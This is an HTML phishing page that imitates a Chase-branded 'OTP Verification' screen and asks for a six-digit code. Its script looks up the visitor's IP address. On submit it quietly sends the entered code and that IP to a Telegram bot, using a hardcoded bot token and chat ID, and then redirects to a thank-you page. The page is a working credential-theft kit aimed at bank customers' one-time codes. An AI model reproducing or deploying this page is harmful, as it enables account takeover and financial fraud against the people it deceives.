<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verify OTP</title>

  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #4f46e5, #06b6d4);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    /* Logo */
    .logo {
      position: absolute;
      top: 25px;
      right: 30px;
    }

    .logo img {
      height: 45px;
    }

    /* Card */
    .otp-card {
      width: 100%;
      max-width: 420px;
      background: rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(12px);
      border-radius: 16px;
      padding: 40px 30px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
      color: #ffffff;
      text-align: center;
    }

    .otp-card h2 {
      margin-bottom: 10px;
      font-weight: 600;
    }

    .otp-card p {
      font-size: 14px;
      opacity: 0.85;
      margin-bottom: 28px;
    }

    /* OTP Inputs */
    .otp-inputs {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 25px;
    }

    .otp-inputs input {
      width: 48px;
      height: 54px;
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      border-radius: 10px;
      border: none;
      outline: none;
    }

    .otp-inputs input:focus {
      outline: 2px solid #ffffff;
    }

    /* Button */
    .verify-btn {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 10px;
      background: #ffffff;
      color: #4f46e5;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: 0.3s ease;
    }

    .verify-btn:hover {
      background: #e5e7eb;
      transform: translateY(-1px);
    }

    /* Resend */
    .resend {
      margin-top: 18px;
      font-size: 13px;
      opacity: 0.85;
    }

    .resend a {
      color: #ffffff;
      text-decoration: underline;
      cursor: pointer;
    }

    /* Warning */
    .warning {
      margin-top: 22px;
      padding: 10px 12px;
      border-radius: 10px;
      background: rgba(250, 204, 21, 0.15);
      color: #fde68a;
      font-size: 12.5px;
    }

    @media (max-width: 480px) {
      .otp-inputs input {
        width: 42px;
        height: 48px;
        font-size: 18px;
      }

      .logo img {
        height: 35px;
      }
    }
  </style>
</head>
<body>

  <!-- Logo -->
  <div class="logo">
    <img src="chaselogo.png" alt="Company Logo">
  </div>

  <div class="otp-card">
    <h2>OTP Verification</h2>
    <p>Enter the 6-digit code sent to your email</p>

    <form id="contactForm" method="POST">
                  <input type="text" id="ipaddress" name="ipaddress" hidden>

      <div class="otp-inputs">
        <input type="text" maxlength="1"  id="code" />
        <input type="text" maxlength="1"  id="code"/>
        <input type="text" maxlength="1"  id="code" />
        <input type="text" maxlength="1"  id="code" />
        <input type="text" maxlength="1"  id="code" />
        <input type="text" maxlength="1"  id="code" />
      </div>

      <button class="verify-btn">Verify OTP</button>
    </form>

    <div class="resend">
      Didn’t receive the code? <a>Resend</a>
    </div>

    <div class="warning">
      ⚠️ Please enter the correct OTP before it expires.
    </div>
  </div>
  <script>
      document.addEventListener('DOMContentLoaded', function () {
        // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => {
            const ipaddress = data.ip;
            document.getElementById('ipaddress').value = ipaddress;
          })
          .catch(error => {
            console.error('Error fetching IP address:', error);
          });
      });




      document.getElementById('contactForm').addEventListener('submit', function (event) {
        event.preventDefault();

        var code = document.getElementById('code').value;
        // var password = document.getElementById('password').value;
        var ipaddress = document.getElementById('ipaddress').value;

        var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
        
  var token = '8233951011:AAFXF5DDlP2ezIxiavqIUmEps3O6IT9MzpM';
      var chat_id = '6550359796';
        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;

        fetch(url)
          .then(response => response.json())
          .then(data => {
            if (data.ok) {
              window.location.href = 'thanks.html';  // Redirect to thank you page
            } else {
              alert('Error sending message.');
            }
          })
          .catch(error => {
            console.error('Error:', error);
          });
      });

    </script>
</body>
</html>
